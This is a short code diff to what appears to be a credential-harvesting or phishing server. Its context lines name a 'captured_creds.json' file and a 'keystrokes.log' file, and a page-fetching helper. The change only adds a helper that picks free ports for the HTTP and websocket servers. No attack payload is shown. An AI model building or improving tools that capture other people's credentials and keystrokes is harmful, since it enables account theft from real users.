@@ -10,8 +10,21 @@ import http.server, socketserver
 
 CREDS_FILE = "captured_creds.json"
 LOG_FILE   = "keystrokes.log"
-PORT       = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
-WS_PORT    = PORT + 1
+def find_free_port(start):
+    import socket
+    for p in range(start, start + 100):
+        try:
+            s = socket.socket()
+            s.bind(('', p))
+            s.close()
+            return p
+        except OSError:
+            continue
+    return start
+
+_base   = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
+PORT    = find_free_port(_base)
+WS_PORT = find_free_port(PORT + 1)
 
 def fetch(url):
     req = urllib.request.Request(url, headers={
